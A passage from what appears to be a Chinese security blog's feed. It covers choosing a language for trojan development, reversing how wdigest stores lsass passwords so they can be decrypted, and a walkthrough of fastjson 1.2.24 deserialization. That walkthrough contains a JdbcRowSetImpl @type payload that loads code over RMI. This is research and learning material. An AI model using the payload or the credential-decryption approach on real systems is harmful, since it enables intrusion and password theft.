语言选择需要根据当前红队的开发能力来做，目前比较流行的有python、c#、c/c++，还有最近很火的nim。对于木马开发来讲，我比较倾向于c/c++。python与c#最大的问题是依赖，python打包后体积太大不利于传输或捆绑。c#得益于大部分系统都已经安装了.net，在体积上没有那么劣势，但是.net版本难以协调。有些lib不兼容.net2.0，而有些lib太老早已不维护。并且4.0比2.0多太多新的东西，要想写出兼容性好的代就要放弃这些特性，这又与“便捷”走远了。之前用过一段c#做木马开发，一个组件要维护两个版本，感觉很麻烦，因此我个人不是很喜欢用c#。nim这个语言很好，他实际上是一个代码转译器，将nim代码转为其他代码再通过编译器去编译，它是一个更好的c，因此不存在依赖问题，同时又兼顾了开发的便捷性。我不选择nim其实很大一部分原因是因为我并不熟悉它，不知道它会有怎样的坑，而我在c/c++的领域已经有了一些积累，有很多可以复用的代码让我的开发速度不亚于使用其他语言。另一部分原因是因为c++的模板，它可以做的事情太多了，暂时还没有看到nim里有更好的方式来替代它。c/c++的好处是我可以去干任何事，并且c/c++的代码库很丰富，不管什么功能都可以找到对应的实现。坏处是开发者必须要去干任何事，同时它太底层了，少了很多高级语言的特性，尽管模版可以弥补，但是这就带来了一定的门槛。 其他 两个月前写的文章，因为忙于其他事一直没有写完，这两天修修补补总算是差不多了。做这个方向感觉没什么人可以交流，大部分选手所谓的免杀都仅仅停留在使用不同的loader加载shellcode做个文件免杀，没啥意思。不过木马作为终端攻防的重点，一定会随着需求的增加有所发展，相信之后深入研究这些的人会越来越多。</summary></entry><entry><title type="html">wdigest逆向</title><link href="https://citrusice.github.io/posts/wdigest-reverse/" rel="alternate" type="text/html" title="wdigest逆向" /><published>2020-12-11T17:28:20+08:00</published><updated>2020-12-11T17:28:20+08:00</updated><id>https://citrusice.github.io/posts/wdigest-reverse</id><content type="html" xml:base="https://citrusice.github.io/posts/wdigest-reverse/">&lt;p&gt;逆向从wdigest的SpAcceptCredentials开始，当使用windows账户凭据做认证时lsass将会调用这个函数。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211161323616.png&quot; alt=&quot;image-20201211161323616&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第二个参数是用户名，第三个结构是一个指向未知结构体的指针，其中包含用户名，主机名，以及明文的密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211161700795.png&quot; alt=&quot;image-20201211161700795&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之后会根据传入的参数，开辟一块buffer，将数据写入，实际上这里是一个未公开的结构&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211162019658.png&quot; alt=&quot;image-20201211162019658&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到写入了用户名、主机名等信息&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211162321781.png&quot; alt=&quot;image-20201211162321781&quot; /&gt;&lt;/p&gt;

&lt;p&gt;将刚刚的结构体放入了l_LogSessList双向链表中&lt;/p&gt;

&lt;p&gt;wdigest同样也会将密码写入这个buffer，以加密形式存储。这意味着我们可以通过获取密钥的方式来解密这块内存来获得wdigest中存储的密码。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211162435396.png&quot; alt=&quot;image-20201211162435396&quot; /&gt;&lt;/p&gt;

&lt;p&gt;经过调试发现使用的加密函数是位于lsasrv.dll中的LsaProtectMemory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211162648348.png&quot; alt=&quot;image-20201211162648348&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看出根据输入的密钥长度不同，LsaEncryptMemory会使用aes加密或3des加密，最终调用的函数都是BCrypt&lt;/p&gt;

&lt;p&gt;因此只要找到lsasrv.dll存储于内存中的key我们就能够解密出wdigest中存储的用户密码&lt;/p&gt;

&lt;p&gt;想要更好的使用工具或者开发自己的工具就需要深入了解其内部的机制&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">逆向从wdigest的SpAcceptCredentials开始，当使用windows账户凭据做认证时lsass将会调用这个函数。</summary></entry><entry><title type="html">fastjson 1.2.24反序列化过程学习</title><link href="https://citrusice.github.io/posts/fastjson-serialization-analisys/" rel="alternate" type="text/html" title="fastjson 1.2.24反序列化过程学习" /><published>2020-09-06T21:22:23+08:00</published><updated>2020-09-06T21:22:23+08:00</updated><id>https://citrusice.github.io/posts/fastjson-serialization-analisys</id><content type="html" xml:base="https://citrusice.github.io/posts/fastjson-serialization-analisys/">&lt;p&gt;本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧&lt;/p&gt;

&lt;p&gt;分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;调试用的代码&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Group&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner&lt;/p&gt;

&lt;h2 id=&quot;jsonscanner&quot;&gt;JSONScanner&lt;/h2&gt;

&lt;p&gt;JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部&lt;/p&gt;

&lt;p&gt;JSONLexerBase有几个成员变量&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;                           &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//当前指向的位置&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;eofPos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/**
     * A character buffer for literals.
     */&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                         &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/**
     * number start position
     */&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同时JSONScanner也新定义了两个&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//反序列化的字符串&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//字符串长度&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符   &lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;EOI&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JSONScanner的初始化&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JSONScanner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65279&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// utf-8 bom&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;defaultjsonparser&quot;&gt;DefaultJSONParser&lt;/h2&gt;

&lt;p&gt;不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化&lt;/p&gt;

&lt;p&gt;在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801153731844.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;进入这个函数&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;//首先会在已有的deserializer中找，this.derializers是一个hashmap&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;//没有找着就接着找&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;………………&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;……………………&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//继续匹配&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//继续匹配&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAnnotation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道&lt;/span&gt;
